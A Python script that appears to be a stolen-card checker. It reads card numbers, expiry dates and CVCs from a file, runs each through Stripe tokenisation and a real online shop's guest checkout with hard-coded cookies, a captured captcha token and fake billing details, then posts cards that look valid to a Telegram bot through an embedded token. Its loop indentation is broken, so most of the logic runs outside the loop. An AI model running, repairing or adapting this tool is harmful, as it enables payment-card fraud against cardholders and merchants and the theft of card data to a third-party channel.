
import requests
import pyfiglet
import os
import time
import re
import random
import string
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
logo = pyfiglet.figlet_format('  HSO ')
print(Z+logo)
o=("------------------------------------------------------------")
print(F+o)
combo= '50.txt'
file=open(f'{combo}',"+r")
token = '5746105547:AAHlS7xb6SbMNstHdKE9UZy7N0NZvDfpi-I'
ID = '5468343177'
start_num = 0
for P in file.readlines():
    start_num += 1
    n = P.split('|')[0]
    mm=P.split('|')[1]
    yy=P.split('|')[2][-2:]
    cvc=P.split('|')[3].replace('\n', '')
    P=P.replace('\n', '') 
    random_letters = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
    import requests
 
    headers = {
     'authority': 'api.stripe.com',
     'accept': 'application/json',
     'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'content-type': 'application/x-www-form-urlencoded',
     'origin': 'https://js.stripe.com',
     'referer': 'https://js.stripe.com/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-site',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 }
data = f'billing_details[address][state]=Navarra&billing_details[address][postal_code]=10080&billing_details[address][country]=ES&billing_details[address][city]=Newyork&billing_details[address][line1]=New&billing_details[email]=44bt034%40gmail.com&billing_details[name]=Ali+Ali&billing_details[phone]=13234762351&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2Fe16b3287b8%3B+stripe-js-v3%2Fe16b3287b8%3B+payment-element%3B+deferred-intent%3B+autopm&referrer=https%3A%2F%2Fwww.moltoshop.com&time_on_page=116074&client_attribution_metadata[client_session_id]=b0c3d663-3561-42fc-8e77-193b080a8446&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=automatic&guid=06d11852-02b5-45de-a218-babff3e3b043f8ead6&muid=0c9ffee1-89d0-45e5-b50d-b23d46f89360de4d2b&sid=a08d50d4-fa8d-4420-a363-c1b97f3274c92f4aca&key=pk_live_51IgnWAIDRq3ZTld9NhefEhH61ihiJRvFqpxLKfmesVMHu0l100rSKVTzzytBp3EqwLMGJK1UvnKqHGZH97TtlH6s009ftj6VdV&_stripe_version=2020-03-02&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZyIERV-PO7JzR8pJtZkOulw_wWVOHJLXQuPWjlbFLT5cRsJAMDhpy0M7sGE9FXttmLT0xpifmHgyVeoBoWTOqUhIK6-rzy1rUJukLjUJ4-bVBpIFhpW2exXHHoUENVAz1KOgTvvF7GH3PpaNsEj0ReceaWJtSz0w-1Wf6c_Ibug5-PeL7LZo4KorHNm1zoQRYRbLmtkyUsk-OWgQ9tQ8kdrQCjggfIv5c33CgquHLEB7nG3pXpugMUTVOR8QLkS_2En6EF3AgScmYdQh2pgQBrkNs5ERRVymZAnQAwBFy9ti9gKg5SYgXHuivKR6EDbKw59c8B0zlibZbDlPGaGHKLWvPsjkaSAt2hxzdfsemMoNx8yXxUjQZ4vNUz1e0n0aHjpAVyobjfLLQajBUhxNkoL6BCHrXa_lWSpB_mIgvTxGOkxurWS1rBAoO6-0AcFnzXREbKY-u1LpzlnnUym96oMmt6hrGJ5JxD8DzTzOpw79W9SNj0mTwd7Alt-DO4QqKRguwP6cz3uDl6jqOY41J6eJvR9Nltbhn1N1LuyuNn0Xlcxdm3qrqOu-dNSn57mqemP2La7yNnCg-EolcJpEnAy77NJWREuaGqFW9-mArzu5dHrBUGRg2zkT3zBZqSGX9CCxRw378t3SP8-1UwrsxXJl-YciQGtUwjwt8NAcMjlsLzoDME2mU9y5ftOliE_o2CKSZPiAzhwl2zwec2mQkwz6tuDsoMjDDQ_YRwmGAe6WUJYhWkOqmnQbZeOXtuvRQvkmsFnh0PyLZA_u8aUidUopOkEqU2BaCGcLa8t9eGPWwOoP8sXSfEO-QlAluN5UoN-Rm4TAARxlCrZZfrg_YI0c3WYR-vn0o4q2iy5QCe2tISI1F-aXxTshuYTWzWDTgvZ2QfLAOzpZ7pa8PHNHVBWQ6hhJ1cG-aFoO8nv9vpHjZ41zUmFrGpAjNErSd4k2gOcif35_jLjfrluIKmyCEO5IYAXFAtRP390OW9quQKMIBQ_FK3rw3od0QSFLK7b8iR8FR4iHh1h8jfqtNiFCYtNXF8QEt-I40krocdRX_JHsnG_fPwFxS_5LZOry7rN05NMH-bNnt-s8ccle0zxr7sB39ruFBYl0S4imQ26YEwN7dV9QM0lb0C0T0-CPbEUUTCgmMY0FHfgrCPV_JiDHr7KqZCgXtFEiAeq6sTzGFftmVugN--RVJGaBoNQU0n3bUQ8Akl5RVHWoGOBoReus61BAzhOlsJM8omwC8f-kEkl6q62sFxFtTszqMhcwCSmvH2Q2dIxwtdAtCBoQuAgWOxt4R8-a_07MaHxIX-TldtT2SKmHNe_qgeEEOl85zwu8Lp5y_wyMs1yHKz-gzPOobSZNlGu6g39yp9n73Ueyyk00jM6DAF17TQMTfJ_mXqC11AY2VY6LNaXiT36G-uaWMCnP9ErKL-frPrR4mla7TT_ULKh_7hZnWWwMKcBzZpuNInG8JZvstU35vzyRW9XlsUzAutm3YkYL9ZFO-ycqewtIg57U6qQDm1-C0G24tBjDlhfv6ZGOku_yPjWaHDs_ozGccNgxvoQhlPDNgCnCkCeEXWXsR--5UFzWsmyXPPzMqxPPN0zJI9SU2wLO78QzGiFHg1-5d_ZoR-IFXK-fdJ8zo3e17BH0IvRzj7Hm7UyClFOHsGPqV_4uOFE3FSjopZ1a3D86XB33z-KeXojGCjOVIdizC6LKZPyqYG4U3fF3DJfbAUYNprfSGakx9TGMF-tLvxGd1TFodcEvAAb4neJJBQdNT67Ettavo1ew-VDf8sVIJRcSRF3hK38hnx5Aw80muwXti5dpPEWJK0Iluthf7bewOuJFYbBlx7o6cS6FNi0czh93ChFcwlauvVzbFX3Sw0H6Fon4X0tEpeBfXTGXh6V8zCEWJ7oqGAivOADnIVdkB658AuR6c3_3su3WZlG1VKk7DAyg4acJh1gVysCeFID1cXXO2414CPydtjjDGRRqGfXun-09y4FvQVMaxPMvGWQVyV51YoVHV4-CdXoZxF_Os_UMKIW0NiP9wkCXCydYxP1X39VD1vXOJ-0GHGpbZ_gr4cTS5l-Yax6jVm-wo6RrnUCI4xn_c2t9uMNZc7zRIj5weZtImGRPc1G8mZaSXh40veNsWTqDdToUo9fw9bLbiyW91HGbvcmiuug2EA0SB9X8Ud4LQaAhH-PBbTd2CBo2V4cM5mZa7TqHNoYXJkX2lkzg07ZCmia3KoMTkzNDU4MWWicGQA.lOQlqf4njYMbrra0iyQUN_oDpl_M-lTqh5k_MVeIIP0'
 
response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
id = (response.json()['id'])
cookies = {
     'PHPSESSID': '8dslnqd98l8821c5ltfuhkfom4',
     'mage-cache-storage': '%7B%7D',
     'mage-cache-storage-section-invalidation': '%7B%7D',
     'CookieConsent': '{stamp:%276U7PxKVsJk1pGhkrYvZf4lgjn0HHf1wPjAOHUlL+h5cUDdw8vHzaKg==%27%2Cnecessary:true%2Cpreferences:true%2Cstatistics:true%2Cmarketing:true%2Cmethod:%27explicit%27%2Cver:1%2Cutc:1717939663585%2Cregion:%27us-06%27}',
     '_gid': 'GA1.2.1706377777.1717939666',
     'mage-cache-sessid': 'true',
     '_fbp': 'fb.1.1717939675994.98496576717907761',
     'form_key': '1doKH2LXGNzcS7Jh',
     'mage-messages': '',
     'recently_viewed_product': '%7B%7D',
     'recently_viewed_product_previous': '%7B%7D',
     'recently_compared_product': '%7B%7D',
     'recently_compared_product_previous': '%7B%7D',
     'product_data_storage': '%7B%7D',
     'private_content_version': '3c275d747d905135e7659936eec9253f',
     'wp_ga4_customerGroup': 'NOT%20LOGGED%20IN',
     'wp_customerGroup': 'NOT%20LOGGED%20IN',
     '_ga': 'GA1.2.927258745.1717939665',
     '__stripe_mid': '0c9ffee1-89d0-45e5-b50d-b23d46f89360de4d2b',
     '__stripe_sid': 'a08d50d4-fa8d-4420-a363-c1b97f3274c92f4aca',
     '_gcl_au': '1.1.122372428.1717939666.1229137099.1717939745.1717939745',
     '_ga_FK1F8QW8J6': 'GS1.1.1717939664.1.1.1717939764.35.0.276906359',
     'section_data_ids': '%7B%22cart%22%3A1717939700%2C%22directory-data%22%3A1717939686%2C%22wp_ga4%22%3A1717939747%2C%22gtm%22%3A1717939747%2C%22messages%22%3A1717939784%7D',
 }
 
headers = {
     'authority': 'www.moltoshop.com',
     'accept': '*/*',
     'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'content-type': 'application/json',
     # 'cookie': 'PHPSESSID=8dslnqd98l8821c5ltfuhkfom4; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; CookieConsent={stamp:%276U7PxKVsJk1pGhkrYvZf4lgjn0HHf1wPjAOHUlL+h5cUDdw8vHzaKg==%27%2Cnecessary:true%2Cpreferences:true%2Cstatistics:true%2Cmarketing:true%2Cmethod:%27explicit%27%2Cver:1%2Cutc:1717939663585%2Cregion:%27us-06%27}; _gid=GA1.2.1706377777.1717939666; mage-cache-sessid=true; _fbp=fb.1.1717939675994.98496576717907761; form_key=1doKH2LXGNzcS7Jh; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; private_content_version=3c275d747d905135e7659936eec9253f; wp_ga4_customerGroup=NOT%20LOGGED%20IN; wp_customerGroup=NOT%20LOGGED%20IN; _ga=GA1.2.927258745.1717939665; stripe_mid=0c9ffee1-89d0-45e5-b50d-b23d46f89360de4d2b; stripe_sid=a08d50d4-fa8d-4420-a363-c1b97f3274c92f4aca; _gcl_au=1.1.122372428.1717939666.1229137099.1717939745.1717939745; _ga_FK1F8QW8J6=GS1.1.1717939664.1.1.1717939764.35.0.276906359; section_data_ids=%7B%22cart%22%3A1717939700%2C%22directory-data%22%3A1717939686%2C%22wp_ga4%22%3A1717939747%2C%22gtm%22%3A1717939747%2C%22messages%22%3A1717939784%7D',

'origin': 'https://www.moltoshop.com',
     'referer': 'https://www.moltoshop.com/es/checkout/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-origin',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
     'x-requested-with': 'XMLHttpRequest',
 }
 
json_data = {
     'cartId': 'txwON5ZetgtjNi2nPQfeGZK75Xz4Sefu',
     'billingAddress': {
         'countryId': 'ES',
         'regionId': '165',
         'regionCode': 'Navarra',
         'region': 'Navarra',
         'street': [
             'New',
         ],
         'company': '',
         'telephone': '13234762351',
         'postcode': '10080',
         'city': 'Newyork',
         'firstname': 'Ali',
         'lastname': 'Ali',
         'middlename': '',
         'saveInAddressBook': None,
     },
     'paymentMethod': {
         'method': 'stripe_payments',
         'additional_data': {
             'payment_element': True,
             'payment_method': id,
             'manual_authentication': 'card',
         },
         'extension_attributes': {
             'agreement_ids': [
                 '1',
                 '6',
             ],
         },
     },
     'email': '44bt034@gmail.com',
 }
 
response = requests.post(
     'https://www.moltoshop.com/es/rest/es/V1/guest-carts/txwON5ZetgtjNi2nPQfeGZK75Xz4Sefu/payment-information',
     cookies=cookies,
     headers=headers,
     json=json_data,
 )
time.sleep(10)
status = response.text
if "Your card was declined." in status or "expiration month is invalid" in status or "Your card number is" in status:
     print(Z+f'[{start_num}]',P,'➜'+'\nRESPONSE :'+ status +'\n')
#
elif "funds" in status or "challenge_required" in status:
     mgs2=f'''
[ϟ]Card ϟ {P}
[ϟ]Status ϟ OTP ✅
[ϟ]Message ϟ {status}
[ϟ]Gateway ϟ Brintree 3D
'''
     tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={mgs2}"
     i = requests.post(tlg)
     print(F+f'[{start_num}]',P,'➜'+'\nRESPONSE :'+ status +'\n')
else:
     print(Z+f'[{start_num}]',P,'➜'+'\nRESPONSE :'+ status +'\n')